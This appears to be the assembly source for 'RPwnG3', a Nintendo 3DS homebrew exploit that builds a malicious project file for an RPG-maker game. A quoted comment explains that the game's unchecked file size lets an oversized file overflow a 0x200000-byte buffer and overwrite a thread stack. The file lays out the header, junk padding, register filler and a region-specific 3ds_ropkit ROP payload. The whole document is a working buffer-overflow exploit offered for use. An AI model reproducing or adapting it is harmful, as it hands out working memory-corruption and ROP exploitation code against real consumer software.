.arm
.global _start
.section .init

#include "./ropinclude/constants.h"

_start:
@ Header
.hword 0x1010
.ascii "rtk0805a"

.org 0x14
.byte 0x04
.org 0x18
.byte 0x48, 0xE3, 0x02, 0x00

#if defined(USA)
	.string16 "RPwnG3 - USA" @ UTF-16 RPG Project-name
#elif defined(JPN)
	.string16 "RPwnG3 - JPN" @ UTF-16 RPG Project-name
#elif defined(EUR)
	.string16 "RPwnG3 - EUR" @ UTF-16 RPG Project-name
#else
    #error "No region selected."
#endif

.org 0x80
.string16 "By ChampionLeake" @ UTF-16 Author-name

.org 0xB4
.word (end - _start) @ "When loading a project, the game loads the file to a 0x200000 bytes long buffer. However the size remains unchecked, so with a big enough file one can overflow the buffer and overwrite a thread stack and then achieve ROP." -NbaYoh
.org 0xE8
.byte 0x01

.org 0x138
.incbin "./assets/file_0.bin" @ Junk data to increase file-size
.word GARBAGE	@ r4
.word GARBAGE	@ r5
.word GARBAGE	@ r6

#if defined(USA)
	.incbin "./3ds_ropkit/build/usa/payload.bin" @ yellows8 3ds_ropkit payload
#elif defined(JPN)
	.incbin "./3ds_ropkit/build/jpn/payload.bin" @ yellows8 3ds_ropkit payload
#elif defined(EUR)
	.incbin "./3ds_ropkit/build/eur/payload.bin" @ yellows8 3ds_ropkit payload
#else
    #error "No region selected."
#endif

end: